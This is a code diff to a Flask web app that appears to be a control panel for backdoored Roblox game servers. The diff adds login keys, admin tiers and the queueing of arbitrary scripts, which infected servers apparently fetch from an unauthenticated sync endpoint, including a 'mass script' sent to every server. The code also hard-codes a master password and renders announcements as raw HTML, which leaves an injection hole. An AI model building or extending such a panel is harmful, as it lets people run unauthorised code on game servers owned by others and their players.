@@ -5,15 +5,12 @@ app = Flask(__name__)
 app.secret_key = "vantage_v30_final_tier"
 MASTER_ADMIN_PW = "SkibidiToiletSigmaRizzler" 
 
-# These stay alive as long as the script is running
-if not hasattr(app, 'global_servers'):
-    app.global_servers = {} 
-if not hasattr(app, 'announcements'):
-    app.announcements = []
-
+# DATA STORAGE (Does not reset on refresh)
+global_servers = {} 
 user_sessions = {}
 valid_keys = {}
 mass_execute_queue = []
+announcements = []
 
 def generate_key(k_type="standard"):
     k = "VANTAGE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
@@ -45,6 +42,7 @@ body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; 
 .ann-time { color: #555; font-size: 9px; display: block; margin-bottom: 5px; }
 
 .hidden { display: none !important; }
+.key-badge { background: #111; padding: 10px; border-radius: 8px; font-family: monospace; border: 1px solid var(--gold); font-size: 11px; margin-bottom: 10px; display: block; width: 100%; text-align: center; }
 input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 15px; color: #fff; width: 100%; border-radius: 12px; outline: none; margin-bottom: 10px; }
 textarea { color: #0f0; font-family: 'Consolas', monospace; height: 250px; resize: none; border-left: 5px solid var(--gold); }
 """
@@ -65,6 +63,7 @@ DASH_HTML = """
         <div class="nav-item" onclick="tab('ann_tab', this)">Announcements</div>
         <div class="nav-item" onclick="tab('exec', this)">Executor</div>
         <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
+        {% if is_admin %}<div class="nav-item" style="color:var(--accent);" onclick="tab('admin_panel', this)">Admin Panel</div>{% endif %}
         {% if is_master %}<div class="nav-item" style="color:#ff4444;" onclick="tab('master', this)">Master Panel</div>{% endif %}
     </div>
     <div class="viewport">
@@ -83,14 +82,25 @@ DASH_HTML = """
         <div id="exec" class="tab hidden"><div class="card" style="max-width: 700px; margin: auto;"><p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p><textarea id="code_area" placeholder="-- PASTE SCRIPT HERE"></textarea><button id="exec_btn" class="btn" onclick="execute()">EXECUTE</button></div></div>
         <div id="white" class="tab hidden"><div class="card" style="max-width: 400px; margin: auto; text-align: center;"><input id="w_input" placeholder="Roblox Username"><button id="w_btn" class="btn" onclick="addWhite()">WHITELIST</button><div id="profile_box" class="hidden" style="margin-top:20px;"><img id="p_img" src="" style="width:80px; border-radius:50%;"><h3 id="p_name"></h3><button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET</button></div></div></div>
         
+        <div id="admin_panel" class="tab hidden">
+            <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
+                <h2 style="color:var(--accent);">Admin Panel</h2>
+                <input id="ann_msg" placeholder="Announcement Content...">
+                <button class="btn" style="background:var(--accent); color:#fff; margin-bottom:20px;" onclick="postAnn()">POST ANNOUNCEMENT</button>
+                <button class="btn" onclick="genKey('standard', 'key_list_admin')">GENERATE STANDARD KEY</button>
+                <div id="key_list_admin" style="margin-top:15px;"></div>
+            </div>
+        </div>
+
         {% if is_master %}
         <div id="master" class="tab hidden">
             <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
-                <h2 style="color:#ff4444;">Master Controls</h2>
-                <input id="ann_msg" placeholder="Announcement Content...">
-                <button class="btn" style="background:var(--accent); color:#fff; margin-bottom:20px;" onclick="postAnn()">SEND ANNOUNCEMENT</button>
+                <h2 style="color:#ff4444;">Master Panel</h2>
                 <textarea id="mass_code" style="height:100px;" placeholder="-- MASS SCRIPT (ALL SERVERS)"></textarea>
                 <button class="btn" style="background:#ff4444; color:#fff;" onclick="massExec()">SEND TO ALL</button>
+                <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
+                <div style="display:flex; gap:10px;"><button class="btn" onclick="genKey('standard', 'key_list_master')">GEN STANDARD</button><button class="btn" style="background:#bc13fe; color:#fff;" onclick="genKey('admin', 'key_list_master')">GEN ADMIN</button></div>
+                <div id="key_list_master" style="margin-top:15px;"></div>
             </div>
         </div>
         {% endif %}
@@ -98,16 +108,10 @@ DASH_HTML = """
     {% endif %}
 <script>
     let privacyOn = false;
-    function launchRoblox(jid, pid) {
-        window.location.href = `roblox-player:1+launchmode:play+gameinstanceid:${jid}+placeid:${pid}`;
-    }
+    function launchRoblox(jid, pid) { window.location.href = `roblox-player:1+launchmode:play+gameinstanceid:${jid}+placeid:${pid}`; }
     function togglePrivacy() { privacyOn = !privacyOn; sync(); }
-    function tab(name, el) { 
-        document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); 
-        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); 
-        document.getElementById(name).classList.remove('hidden'); 
-        el.classList.add('active-nav'); 
-    }
+    function tab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); document.getElementById(name).classList.remove('hidden'); el.classList.add('active-nav'); }
+    
     function sync() {
         fetch('/api/global_signals').then(r => r.json()).then(data => {
             let sHtml = "";
@@ -116,68 +120,109 @@ DASH_HTML = """
                 sHtml += `<div class="card ${privacyOn ? 'privacy-active' : ''}"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b>GAME:</b> ${s.name}<br><b>OWNER:</b> ${s.owner}<br><b>PLRS:</b> ${s.p_count}</div><button class="btn" onclick="launchRoblox('${id}', '${s.place_id}')">JOIN</button></div>`; 
             }
             document.getElementById('server_grid').innerHTML = sHtml || "<div style='grid-column:1/-1;text-align:center;'>Searching for servers...</div>";
-
             let aHtml = "";
-            data.announcements.slice().reverse().forEach(ann => {
-                aHtml += `<div class="ann-item"><span class="ann-time">${ann.time}</span>${ann.text}</div>`;
-            });
+            data.announcements.slice().reverse().forEach(ann => { aHtml += `<div class="ann-item"><span class="ann-time">${ann.time}</span>${ann.text}</div>`; });
             document.getElementById('ann_list').innerHTML = aHtml;
         });
+        fetch('/api/personal_data').then(r => r.json()).then(data => {
+            if(data.whitelist) { document.getElementById('exec_target').innerText = data.whitelist.name; document.getElementById('p_img').src = data.whitelist.img; document.getElementById('p_name').innerText = data.whitelist.name; document.getElementById('profile_box').classList.remove('hidden'); document.getElementById('w_input').classList.add('hidden'); document.getElementById('w_btn').classList.add('hidden'); }
+            else { document.getElementById('exec_target').innerText = "NONE"; document.getElementById('profile_box').classList.add('hidden'); document.getElementById('w_input').classList.remove('hidden'); document.getElementById('w_btn').classList.remove('hidden'); }
+        });
     }
-    function postAnn() {
-        fetch('/api/admin/post_ann', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg: document.getElementById('ann_msg').value})}).then(() => { document.getElementById('ann_msg').value = ""; sync(); });
-    }
-    function execute() {
-        let btn = document.getElementById('exec_btn');
-        btn.classList.add('executing');
-        fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}).then(() => { setTimeout(() => btn.classList.remove('executing'), 1500); });
-    }
-    function addWhite() { 
-        let btn = document.getElementById('w_btn'); btn.classList.add('searching');
-        fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(() => { btn.classList.remove('searching'); sync(); }); 
-    }
+
+    function postAnn() { fetch('/api/admin/post_ann', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg: document.getElementById('ann_msg').value})}).then(() => { document.getElementById('ann_msg').value = ""; sync(); }); }
+    function execute() { let btn = document.getElementById('exec_btn'); btn.classList.add('executing'); fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}).then(() => { setTimeout(() => btn.classList.remove('executing'), 1500); }); }
+    function addWhite() { let btn = document.getElementById('w_btn'); btn.classList.add('searching'); fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(() => { btn.classList.remove('searching'); sync(); }); }
+    function genKey(type, tid) { fetch('/api/admin/gen_key', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type: type})}).then(r => r.json()).then(d => { document.getElementById(tid).innerHTML = `<div class="key-badge">${d.key}</div>` + document.getElementById(tid).innerHTML; }); }
     function massExec() { fetch('/api/admin/mass_execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('mass_code').value})}); }
+    function resetWhite() { fetch('/api/reset', {method:'POST'}).then(sync); }
     setInterval(sync, 3000);
 </script></body></html>
 """
 
 @app.route('/')
-def index(): return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_master=session.get('is_master'))
+def index(): return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_master=session.get('is_master'), is_admin=session.get('is_admin'))
 
 @app.route('/login', methods=['POST'])
 def login():
-    if request.form.get("pw") == MASTER_ADMIN_PW: session.update({'logged_in': True, 'is_master': True, 'sid': 'MASTER'})
+    pw = request.form.get("pw")
+    if pw == MASTER_ADMIN_PW: session.update({'logged_in': True, 'is_master': True, 'is_admin': True, 'sid': 'MASTER'})
+    elif pw in valid_keys:
+        k_type = valid_keys[pw]
+        session.update({'logged_in': True, 'is_master': False, 'is_admin': (k_type == 'admin'), 'sid': str(uuid.uuid4())})
+        del valid_keys[pw]
     return redirect(url_for('index'))
 
 @app.route('/api/global_signals')
-def get_global(): return jsonify({"servers": app.global_servers, "announcements": app.announcements})
+def get_global(): return jsonify({"servers": global_servers, "announcements": announcements})
+
+@app.route('/api/personal_data')
+def get_personal():
+    sid = session.get('sid')
+    if sid not in user_sessions: user_sessions[sid] = {"whitelist": None, "queue": []}
+    return jsonify(user_sessions[sid])
 
 @app.route('/api/admin/post_ann', methods=['POST'])
 def post_ann():
-    if session.get('is_master'):
-        app.announcements.append({"text": request.json.get("msg"), "time": time.strftime("%H:%M:%S")})
+    if session.get('is_admin'): announcements.append({"text": request.json.get("msg"), "time": time.strftime("%H:%M:%S")})
+    return jsonify({"ok": True})
+
+@app.route('/api/admin/gen_key', methods=['POST'])
+def admin_gen():
+    if not session.get('is_admin'): return jsonify({}), 403
+    return jsonify({"key": generate_key(request.json.get("type", "standard"))})
+
+@app.route('/api/whitelist', methods=['POST'])
+def add_white():
+    sid, user = session.get('sid'), request.json.get("user")
+    try:
+        r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [user]}).json()
+        if r.get("data") and sid:
+            uid, name = r["data"][0]["id"], r["data"][0]["requestedUsername"]
+            img = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png").json()["data"][0]["imageUrl"]
+            user_sessions[sid] = {"whitelist": {"name": name, "img": img}, "queue": []}
+    except: pass
+    return jsonify({"ok": True})
+
+@app.route('/api/reset', methods=['POST'])
+def reset_white():
+    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["whitelist"] = None
+    return jsonify({"ok": True})
+
+@app.route('/api/execute', methods=['POST'])
+def run_exec():
+    if session.get('sid') in user_sessions: user_sessions[session.get('sid')]["queue"].append(request.json.get("code"))
     return jsonify({"ok": True})
 
 @app.route('/roblox/sync', methods=['POST'])
 def roblox_sync():
+    global mass_execute_queue
     data = request.json
     jid = data.get("jobId")
     if jid:
-        if jid not in app.global_servers:
-            app.global_servers[jid] = {"place_id": data.get("game_id"), "thumb": ""}
-        app.global_servers[jid].update({"name": data.get("name"), "owner": data.get("owner"), "p_count": len(data.get("players", []))})
+        if jid not in global_servers:
+            try:
+                t = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png").json()
+                thumb = t["data"][0]["imageUrl"] if t.get("data") else ""
+            except: thumb = ""
+            global_servers[jid] = {"thumb": thumb, "place_id": data.get("game_id")}
+        global_servers[jid].update({"name": data.get("name"), "owner": data.get("owner"), "p_count": len(data.get("players", [])), "last_ping": time.time()})
     
-    # REMOVED CLEANUP: Servers will no longer be deleted from the list!
-    return jsonify({"commands": []})
+    # REMOVED CLEANUP: Servers will no longer be deleted!
+    all_cmds = []
+    for mc in mass_execute_queue: all_cmds.append({"user": "ALL", "code": mc})
+    if mass_execute_queue: mass_execute_queue = []
+    players = [p.lower() for p in data.get("players", [])]
+    for sid, info in user_sessions.items():
+        if info.get("whitelist") and info["whitelist"]["name"].lower() in players:
+            for c in info["queue"]: all_cmds.append({"user": info["whitelist"]["name"], "code": c})
+            user_sessions[sid]["queue"] = []
+    return jsonify({"commands": all_cmds})
 
-# (Rest of simple execute/whitelist routes)
-@app.route('/api/execute', methods=['POST'])
-def run_exec():
-    return jsonify({"ok": True})
-
-@app.route('/api/whitelist', methods=['POST'])
-def add_white():
+@app.route('/api/admin/mass_execute', methods=['POST'])
+def admin_mass():
+    if session.get('is_master'): mass_execute_queue.append(request.json.get("code"))
     return jsonify({"ok": True})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
